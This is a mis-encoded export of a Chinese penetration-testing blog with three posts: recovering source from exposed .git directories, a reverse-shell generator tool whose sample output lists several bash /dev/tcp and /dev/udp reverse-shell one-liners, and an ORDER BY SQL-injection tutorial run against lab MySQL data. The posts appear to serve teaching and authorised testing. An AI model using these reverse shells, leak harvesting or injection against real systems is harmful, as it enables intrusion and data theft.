","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:3","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":".gitæ³„éœ² å°è¯•æ¢æµ‹.gitæ–‡ä»¶ï¼Œå¯èƒ½æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š å“åº”404ï¼Œæ„å‘³ç€åº”ç”¨ç¨‹åºçš„ .git ç›®å½•ä¸å‘å…¬ä¼—å¼€æ”¾ï¼Œæ— æ³•é€šè¿‡è¿™ç§æ–¹å¼æ³„éœ²ä¿¡æ¯ã€‚ å“åº”403ï¼Œè¡¨ç¤º .git ç›®å½•åœ¨æœåŠ¡å™¨ä¸Šå¯ç”¨ï¼Œä½†æ‚¨å°†æ— æ³•ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ï¼Œå› æ­¤æ— æ³•åˆ—å‡ºè¯¥ç›®å½•ä¸­åŒ…å«çš„æ‰€æœ‰æ–‡ä»¶ã€‚ å“åº”200ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°é”™è¯¯å¹¶ä¸”æœåŠ¡å™¨å“åº” .git ç›®å½•çš„æ–‡æ¡£æ ‘ï¼Œæ‚¨å¯ä»¥ç›´æ¥æµè§ˆè¯¥æ–‡ä»¶å¤¹çš„å†…å®¹å¹¶æ£€ç´¢å…¶ä¸­åŒ…å«çš„ä»»ä½•ä¿¡æ¯ã€‚ å¦‚æœæ— æ³•è®¿é—® /.git æ–‡ä»¶å¤¹çš„ç›®å½•åˆ—è¡¨ï¼Œå³æœªå¼€å¯ç›®å½•éå†åŠŸèƒ½ï¼Œåˆ™å¿…é¡»ä¸‹è½½æ‰€éœ€çš„æ¯ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä»ç›®å½•æ ¹ç›®å½•é€’å½’ä¸‹è½½ã€‚ ä½†æ˜¯ï¼Œå½“ç›®æ ‡æ–‡ä»¶å…·æœ‰å¤æ‚è·¯å¾„ï¼ˆä¾‹å¦‚â€œ.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8â€ï¼‰æ—¶ï¼Œå¦‚ä½•æ‰¾å‡ºæœåŠ¡å™¨ä¸Šçš„å“ªäº›æ–‡ä»¶å¯ç”¨ï¼Ÿ è¿™å°±éœ€è¦ä»å·²çŸ¥å­˜åœ¨çš„æ–‡ä»¶è·¯å¾„å¼€å§‹ï¼Œä¾‹å¦‚â€œ.git/HEADâ€ï¼é˜…è¯»æ­¤æ–‡ä»¶å°†ä¸ºæ‚¨æä¾›å½“å‰åˆ†æ”¯çš„å¼•ç”¨ï¼ˆä¾‹å¦‚ï¼Œ.git/refs/heads/masterï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŸ¥æ‰¾ç³»ç»Ÿä¸Šçš„æ›´å¤šæ–‡ä»¶ã€‚ \u003e cat .git/HEAD ref: refs/heads/master \u003e cat .git/refs/heads/master 0a66452433322af3d319a377415a890c70bbd263 \u003e git cat-file -t 0a66452433322af3d319a377415a890c70bbd263 commit \u003e git cat-file -p 0a66452433322af3d319a377415a890c70bbd263 tree 0a72e6850ef963c6aeee4121d38cf9de773865d8 ä»Webä¸Šå°±æ˜¯ï¼š \u003e curl http://xxx.com/.git/HEAD \u003e curl http://xxx.com/.git/refs/heads/master \u003e wget http://xxx.com/.git/objects/0a/66452433322af3d319a377415a890c70bbd263 \u003e git cat-file -t 0a66452433322af3d319a377415a890c70bbd263 commit \u003e git cat-file -p 0a66452433322af3d319a377415a890c70bbd263 tree 0a72e6850ef963c6aeee4121d38cf9de773865d8 .git/refs/heads/master æ–‡ä»¶å°†æŒ‡å‘æ‚¨å­˜å‚¨æäº¤ç›®å½•æ ‘çš„ç›¸åº”å¯¹è±¡å“ˆå¸Œã€‚å¯ä»¥çœ‹åˆ°è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªæäº¤ï¼Œå¹¶ä¸”ä¸æ ‘å¯¹è±¡ 0a72e6850ef963c6aeee4121d38cf9de773865d8 å…³è”ã€‚ ç»§ç»­æ£€æŸ¥å­˜å‚¨åœ¨ 0a72e6850ef963c6aeee4121d38cf9de773865d8 çš„æ ‘å¯¹è±¡æ—¶ï¼š \u003e git cat-file -p 0a72e6850ef963c6aeee4121d38cf9de773865d8 100644 blob 6ad5fb6b9a351a77c396b5f1163cc3b0abcde895 .gitignore 040000 blob 4b66088945aab8b967da07ddd8d3cf8c47a3f53c source.py 040000 blob 9a3227dca45b3977423bb1296bbc312316c2aa0d README 040000 tree 3b1127d12ee43977423bb1296b8900a316c2ee32 resources æ‚¨ä¼šå‘ç°ä¸€äº›æºä»£ç æ–‡ä»¶å’Œå…¶ä»–å¯¹è±¡æ ‘æ¥æ¢ç´¢ã€‚ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œæ‚¨å‘ç°ä¸åŒæ–‡ä»¶çš„è¯·æ±‚çœ‹èµ·æ¥æ›´åƒæ˜¯è¿™æ ·ï¼š https://project.com/.git/HEAD # åˆ¤æ–­ HEAD https://project.com/.git/refs/heads/master # æ‰¾åˆ° HEAD ä¸­å­˜å‚¨çš„å¯¹è±¡ https://project.com/.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8 # è®¿é—®ä¸commitç›¸å…³è”çš„tree https://project.com/.git/objects/9a/3227dca45b3977423bb1296bbc312316c2aa0d # ä¸‹è½½ README æ–‡ä»¶ä¸­å­˜å‚¨çš„æºä»£ç  åœ¨è¿™æ ·çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œæ‚¨éœ€è¦åœ¨è¯»å–ä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶ä¹‹å‰å¯¹å…¶è¿›è¡Œè§£å‹ç¼©ã€‚è¿™å¯ä»¥ä½¿ç”¨ Ruby æ¥å®Œæˆï¼š ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' \u003c OBJECT_FILE ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:4:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"æ•æ„Ÿä¿¡æ¯ ä¹‹åå°±æ˜¯ä»gitæ³„éœ²ä¸­å»å¯»æ‰¾æœ‰ç”¨çš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¡¬ç¼–ç å‡­è¯ã€åŠ å¯†å¯†é’¥å’Œå¼€å‘äººå‘˜è¯„è®ºå¯å¿«é€Ÿäº†è§£ç³»ç»Ÿã€‚ ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:5:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ä»¶ Hacking Git Directories Exposed .git Directory Exploitation ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:6:0","tags":["Pentest","Leaks"],"title":"021-Gitæ³„éœ²æ–‡ä»¶è¿˜åŸ","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["tools"],"content":"RevShellæ˜¯ä¸€ä¸ªåŸºäºGoè¯­è¨€çš„åå¼¹Shellå‘½ä»¤ç”Ÿæˆå·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜åœ¨éœ€è¦ä¸ç›®æ ‡ä¸»æœºå»ºç«‹åå‘è¿æ¥æ—¶å¿«é€Ÿç”Ÿæˆç›¸åº”çš„Shellä»£ç ã€‚","date":"2023-08-14","objectID":"/posts/revshell/","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"RevShell ","date":"2023-08-14","objectID":"/posts/revshell/:1:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"å·¥å…·ç®€ä»‹ RevShellæ˜¯ä¸€ä¸ªåŸºäºGoè¯­è¨€çš„åå¼¹Shellå‘½ä»¤ç”Ÿæˆå·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜åœ¨éœ€è¦ä¸ç›®æ ‡ä¸»æœºå»ºç«‹åå‘è¿æ¥æ—¶å¿«é€Ÿç”Ÿæˆç›¸åº”çš„Shellä»£ç ã€‚ ç›®å‰æ”¯æŒçš„ç±»å‹: bashã€shã€ncã€rubyã€phpã€pythonã€rcatã€perlã€socatã€nodeã€telnetã€zshã€luaã€golangã€vlangã€awkã€crystalã€‚ é™¤äº†æ”¯æŒå¤šç§Shellç±»å‹å¤–ï¼Œrevshellè¿˜å¯ä»¥è¿è¡Œåœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿå¹³å°ä¸Šï¼ŒåŒ…æ‹¬Macã€Linuxå’ŒWindowsã€‚è¿™ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨ä¸åŒçš„ç¯å¢ƒä¸­ä½¿ç”¨revshellæ¥ç”Ÿæˆé€‚ç”¨äºç›®æ ‡ä¸»æœºæ“ä½œç³»ç»Ÿçš„åå¼¹Shellä»£ç ï¼Œæé«˜äº†å·¥å…·çš„çµæ´»æ€§å’Œé€‚ç”¨æ€§ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/BetterDefender/revshell ","date":"2023-08-14","objectID":"/posts/revshell/:2:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"å®‰è£…æ–¹å¼ è‡ªè¡Œç¼–è¯‘è¿è¡Œ $ go build revshell.go ç›´æ¥ä¸‹è½½é¡¹ç›®Releasesä¸­ç¼–è¯‘å¥½çš„å·¥å…· https://github.com/BetterDefender/revshell/releases ","date":"2023-08-14","objectID":"/posts/revshell/:3:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"ä½¿ç”¨æ–¹æ³• $ ./revshell [IPADDR] [PORT] [LANGUAGE] ","date":"2023-08-14","objectID":"/posts/revshell/:4:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"ä½¿ç”¨ç¤ºä¾‹ $ ./revshell 192.168.1.1 2222 bash ","date":"2023-08-14","objectID":"/posts/revshell/:5:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"MacOS $ ./revshell 192.168.1.1 2222 bash _____ _____ _ _ _ _____ | __ \\ / ____| | | | | / ____| | |__) |_____ __ | (___ | |__ ___| | | | | __ ___ _ __ | _ // _ \\ \\ / / \\___ \\| '_ \\ / _ \\ | | | | |_ |/ _ \\ '_ \\ | | \\ \\ __/\\ V / ____) | | | | __/ | | | |__| | __/ | | | |_| \\_\\___| \\_/ |_____/|_| |_|\\___|_|_| \\_____|\\___|_| |_| | ğŸ’» Author: Gh0stX | ğŸ Version: 1.0 | ------------------------------------------ Bash -i: bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2222 0\u003e\u00261 /bin/bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2222 0\u003e\u00261 ------------------------------------------ Bash 196: 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/192.168.1.1/2222; bash \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/192.168.1.1/2222; /bin/bash \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 ------------------------------------------ Bash read line: exec 5\u003c\u003e/dev/tcp/192.168.1.1/2222;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done ------------------------------------------ Bash 5: bash -i 5\u003c\u003e /dev/tcp/192.168.1.1/2222 0\u003c\u00265 1\u003e\u00265 2\u003e\u00265 /bin/bash -i 5\u003c\u003e /dev/tcp/192.168.1.1/2222 0\u003c\u00265 1\u003e\u00265 2\u003e\u00265 ------------------------------------------ Bash UDP: bash -i \u003e\u0026 /dev/udp/192.168.1.1/2222 0\u003e\u00261 /bin/bash -i \u003e\u0026 /dev/udp/192.168.1.1/2222 0\u003e\u00261 ","date":"2023-08-14","objectID":"/posts/revshell/:5:1","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"Windows ","date":"2023-08-14","objectID":"/posts/revshell/:5:2","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"Linux ","date":"2023-08-14","objectID":"/posts/revshell/:5:3","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["tools"],"content":"æ€»ç»“ ä½¿ç”¨RevShellï¼Œæ‚¨å¯ä»¥è½»æ¾ç”Ÿæˆæ‰€éœ€çš„åå¼¹Shellä»£ç ï¼Œä»è€Œåœ¨æ¸—é€æµ‹è¯•ã€æ¼æ´åˆ©ç”¨æˆ–å®‰å…¨è¯„ä¼°ç­‰ä»»åŠ¡ä¸­æ›´åŠ é«˜æ•ˆåœ°ä¸ç›®æ ‡ä¸»æœºè¿›è¡Œäº¤äº’å’Œæ§åˆ¶ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€ŒGh0stXã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_42575797/article/details/132188010 ","date":"2023-08-14","objectID":"/posts/revshell/:6:0","tags":["tools"],"title":"020-RevShellï¼šä¸€æ¬¾å¥½ç”¨çš„ç”Ÿæˆåå¼¹Shellå‘½ä»¤çš„å·¥å…·","uri":"/posts/revshell/"},{"categories":["Pentest"],"content":"æœ¬ç¯‡æ–‡ç« ä½œè€…Xavierï¼Œæœ¬æ–‡å±iæ˜¥ç§‹åŸåˆ›å¥–åŠ±è®¡åˆ’ï¼Œé¦–å‘äºiæ˜¥ç§‹è®ºå›ï¼Œæœªç»è®¸å¯ç¦æ­¢è½¬è½½ã€‚ åŸæ–‡åœ°å€ï¼šhttps://bbs.ichunqiu.com/thread-63491-1-1.html ä¹‹å‰ä¸€ç¯‡æ–‡ç« è®²äº†GROUP BY ä½ç½®ç‚¹çš„æ³¨å…¥ï¼Œè¿™æ¬¡è®²ä¸‹ORDER BYä½ç½®ç‚¹çš„æ³¨å…¥ã€‚ ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:0:0","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"order byç®€ä»‹ ORDER BYè¯­å¥æ˜¯SQLè¯­æ³•ä¸­ç”¨äºå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºçš„å­å¥ã€‚å®ƒå¯ä»¥æŒ‰ç…§ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—çš„å€¼è¿›è¡Œå‡åºï¼ˆASCï¼‰æˆ–é™åºï¼ˆDESCï¼‰æ’åºã€‚ ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:0","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"è¯­æ³• ORDER BYå­å¥é€šå¸¸ç´§è·Ÿåœ¨SELECTè¯­å¥çš„æœ€åï¼Œç”¨äºæŒ‡å®šæ’åºçš„è§„åˆ™ã€‚ä¸‹é¢æ˜¯ORDER BYè¯­å¥çš„ä¸€èˆ¬è¯­æ³•å½¢å¼ï¼š SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value ORDER BY column_name1 [ASC|DESC], column_name2 [ASC|DESC], ... LIMIT num; åœ¨ORDER BYå­å¥ä¸­ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ä½œä¸ºæ’åºçš„ä¾æ®ã€‚æŒ‰ç…§æŒ‡å®šçš„åˆ—é¡ºåºè¿›è¡Œæ’åºï¼Œæ¯ä¸ªåˆ—å¯ä»¥æŒ‡å®šæ˜¯å‡åºï¼ˆASCï¼‰è¿˜æ˜¯é™åºï¼ˆDESCï¼‰ï¼Œé»˜è®¤æ˜¯å‡åºæ’åºã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç”¨æ³•å’Œæ³¨æ„äº‹é¡¹ï¼š æ’åºå•ä¸ªåˆ—ï¼šå¯ä»¥é€šè¿‡åˆ—åæŒ‡å®šè¦æ’åºçš„åˆ—ã€‚ä¾‹å¦‚ï¼ŒORDER BY åˆ—å ASCè¡¨ç¤ºæŒ‰å‡åºå¯¹è¯¥åˆ—è¿›è¡Œæ’åºï¼ŒORDER BY åˆ—å DESCè¡¨ç¤ºæŒ‰é™åºå¯¹è¯¥åˆ—è¿›è¡Œæ’åºã€‚ æ’åºå¤šä¸ªåˆ—ï¼šå¯ä»¥æŒ‰ç…§å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œå¤šä¸ªåˆ—ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚æ’åºä¼˜å…ˆçº§æŒ‰ç…§åˆ—åœ¨ORDER BYå­å¥ä¸­çš„é¡ºåºç¡®å®šã€‚ NULLå€¼å¤„ç†ï¼šåœ¨æ’åºä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹NULLå€¼ä¼šè¢«è§†ä¸ºæœ€å°å€¼ï¼ˆå‡åºæ’åºï¼‰æˆ–æœ€å¤§å€¼ï¼ˆé™åºæ’åºï¼‰ã€‚å¯ä»¥ä½¿ç”¨NULLS FIRSTæˆ–NULLS LASTæŒ‡å®šNULLå€¼åœ¨æ’åºä¸­çš„ä½ç½®ã€‚ è¡¨è¾¾å¼æ’åºï¼šé™¤äº†åˆ—åå¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼ä½œä¸ºæ’åºçš„ä¾æ®ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨å‡½æ•°ã€ç®—æœ¯è¡¨è¾¾å¼æˆ–æ¡ä»¶è¡¨è¾¾å¼è¿›è¡Œæ’åºã€‚ æ’åºæ–¹å‘ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ’åºæ˜¯å‡åºçš„ã€‚å¯ä»¥ä½¿ç”¨ASCæˆ–DESCå…³é”®å­—æ˜ç¡®æŒ‡å®šæ’åºæ–¹å‘ã€‚ASCè¡¨ç¤ºå‡åºï¼ˆé»˜è®¤ï¼‰ï¼ŒDESCè¡¨ç¤ºé™åºã€‚ ORDER BYè¯­å¥åœ¨æŸ¥è¯¢ç»“æœä¸­å¯¹è®°å½•è¿›è¡Œæ’åºï¼Œæä¾›äº†çµæ´»çš„æ’åºåŠŸèƒ½ï¼Œå¯ä»¥æ ¹æ®éœ€è¦å¯¹ç»“æœé›†è¿›è¡Œå®šåˆ¶åŒ–æ’åºã€‚å®ƒå¯¹äºæŒ‰ç‰¹å®šæ¡ä»¶è·å–æœ‰åºç»“æœéå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚æŒ‰ç…§æ—¥æœŸã€æ•°å€¼å¤§å°æˆ–å­—æ¯é¡ºåºè¿›è¡Œæ’åºã€‚ ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:1","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"order by æ³¨å…¥ é€šå¸¸order byæ³¨å…¥æœ‰ä¸¤ä¸ªå¯èƒ½ç‚¹ï¼Œä¸€ä¸ªæ˜¯åˆ—åï¼ˆidï¼‰å¯æ§ï¼Œä¸€ä¸ªæ˜¯æ’åºæ–¹å‘ï¼ˆdescï¼‰å¯æ§ã€‚ select * from table order by id desc å¦‚æœåªèƒ½æ§åˆ¶descè¿™ä¸ªä½ç½®çš„å‚æ•°ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨SQLè¯­æ³•çš„ç‰¹æ€§ï¼Œé€šè¿‡æ‹¼æ¥ desc,\u003ccolumn\u003eçš„å½¢å¼æ§åˆ¶åˆ—åä½œä¸ºæ³¨å…¥ç‚¹ï¼Œå³ï¼š select * from table order by id desc, column_name ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:0","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"1ã€æœ¬åœ°ç¯å¢ƒ ä»¥MySQLä¸ºä¾‹è¿›è¡Œè®²è§£ã€‚ ä¸‹é¢æ¼”ç¤ºç”¨åˆ°2ä¸ªæ•°æ®åº“ï¼ŒMySQL 5.7.26å’ŒMySQL8.0.31 # sqli-labs æ•°æ®åº“ï¼Œç‰ˆæœ¬5.7.26 mysql\u003e select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | | 13 | admin1 | admin3 | +----+----------+------------+ 14 rows in set (0.01 sec) # è‡ªå»ºæ•°æ®åº“ï¼Œç‰ˆæœ¬8.0.31 mysql\u003e select * from users; +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:1","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"2ã€è·å–å­—æ®µæ•° Order by åé¢åŠ æ•°å­—å°±èƒ½è¿›è¡Œå­—æ®µæ•°çš„æšä¸¾ï¼Œå½“æ•°å­—å¤§äºå­—æ®µæ•°æ—¶ï¼Œå°±ä¼šäº§ç”Ÿç±»ä¼¼å¦‚ä¸‹æŠ¥é”™ï¼š mysql\u003e select * from users order by 5; +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 3 | user1 | qwer1234 | 28 | guangzhou | | 2 | test2 | 543210 | 20 | shanghai | +----+-------+----------+------+-----------+ 3 rows in set (0.00 sec) mysql\u003e select * from users order by 6; ERROR 1054 (42S22): Unknown column '6' in 'order clause' ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:2","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"3ã€è”åˆæ³¨å…¥(ç½•è§) order byä½ç½®åæ— æ³•æ¥union selectï¼Œè¯­æ³•ä¸æ”¯æŒï¼ŒæŠ¥é”™å¦‚ä¸‹ã€‚ mysql\u003e select * from users order by id union select 1,2,3,4,5; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1,2,3,4,5' at line 1 ä½†æ˜¯æœ‰ä¸€ç§æƒ…å†µï¼Œå¯èƒ½å¯ä»¥ç”¨ï¼Œå³å‰ä¸€å¥SQLè¯­å¥æ•´ä½“å¤„åœ¨æ‹¬å·ä¸­ã€‚å¦‚ä¸‹ï¼š mysql\u003e (select * from users order by id); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e (select * from users order by id) union select 1,2,3,4,5; +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | | 1 | 2 | 3 | 4 | 5 | +----+--------+----------+------+-----------+ 5 rows in set (0.01 sec) è¿™ç§æƒ…å†µéå¸¸ç½•è§ï¼Œåˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ã€‚ mysql\u003e (select * from users order by id) union select 1,user(),3,4,version(); +----+----------------+----------+------+-----------+ | id | name | pass | age | area | +----+----------------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | | 1 | root@127.0.0.1 | 3 | 4 | 8.0.31 | +----+----------------+----------+------+-----------+ 5 rows in set (0.01 sec) 